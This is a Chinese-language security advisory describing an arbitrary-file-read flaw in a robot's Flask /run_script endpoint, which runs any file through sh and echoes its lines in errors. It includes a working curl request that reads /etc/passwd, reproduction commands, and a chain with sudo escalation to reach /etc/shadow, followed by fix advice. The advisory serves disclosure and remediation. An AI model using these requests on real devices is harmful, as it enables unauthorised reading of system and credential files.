## 1. 漏洞概述

机器人 5000 端口 Flask 后台的 `/run_script` 接口接收 `script`（文件路径）+ `args`（参数），
后端用 `sh <script> <args>` 方式执行。当传入一个**非脚本的普通文件**（如 `/etc/passwd`、
配置文件、日志、源码）时，sh 会逐行把文件内容当作 shell 命令解析，每行解析失败都会在
stderr 中回显该行原始内容（格式 `"<行内容>: not found"`），从而**泄露任意可读文件的完整内容**。

实测泄露 `/etc/passwd`（含 `root:x:0:0:...`、`daemon:x:1:1:...` 等所有账号条目）。

**影响**：未授权读取系统账号、配置文件、日志、源码，为进一步提权/横向移动提供情报。

## 2. 攻击链

```
攻击者（同 WiFi）
   │  ① 直接 POST /run_script，body {"script":"/etc/passwd","args":""}
   ▼
② 后端 sh /etc/passwd 逐行执行
   │     每行 "<内容>: not found" 报错 → stderr 回显原始内容
   ▼
③ 攻击者从 stderr 还原文件完整内容 → 任意文件读取
```

## 3. 漏洞细节

### 3.1 /run_script 行为

- 请求：`POST /run_script`，`Content-Type: application/json`，body `{"script": "<路径>", "args": ""}`；
- 后端先 `os.path.exists(script)` 判断文件是否存在，存在则 `sh <script> <args>`；
- `sh` 把文件每行当命令解析，解析失败的行在 stderr 回显 `"<行内容>: not found"`（或语法错误时回显行号+片段）；
- 由此可逐行还原文件内容。

### 3.2 实测证据

```bash
curl -s -X POST http://192.168.2.1:5000/run_script \
  -H 'Content-Type: application/json' \
  -d '{"script": "/etc/passwd", "args": ""}'
```

响应 stderr 片段：
```
/etc/passwd: <密码_01> root:x:0:0:root:/root:/bin/bash: not found
/etc/passwd: <密码_01> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: not found
/etc/passwd: <密码_01> bin:x:2:2:bin:/bin:/usr/sbin/nologin: not found
...
```

即 `/etc/passwd` 每一行内容完整泄露。

### 3.3 权限边界

- 仅能读 galileo 用户（uid=1000）有读权限的文件；
- root 属主文件（如 `/etc/shadow`、`/home/galileo` 下 root 属主的固件目录）需配合 sudo 提权
  漏洞，先用 `sudo` 把内容拷贝/软链到 galileo 可读位置，再经本漏洞回读。

## 4. 复现步骤

```bash
# 前置：连入机器人 AP

# 读取任意文件
python3 exploit.py 192.168.2.1 /etc/passwd
python3 exploit.py 192.168.2.1 /etc/hostname
python3 exploit.py 192.168.2.1 /home/galileo/xxx/配置文件
```

## 5. 影响范围

- 未授权读取系统账号信息、配置文件、日志、应用源码；
- 泄露机器人部署结构（目录、用户名、服务配置），辅助进一步攻击；
- 配合 sudo 提权，可读 root 文件（/etc/shadow 等）。

## 6. 修复建议

1. `/run_script` 限制为白名单脚本路径，禁止任意路径；
2. 或改为仅执行固定脚本、不把文件当 shell 解析（用 `sh -c` 前做参数校验）；
3. 结合修复 Flask 后台未授权访问（见 RCE 漏洞）。
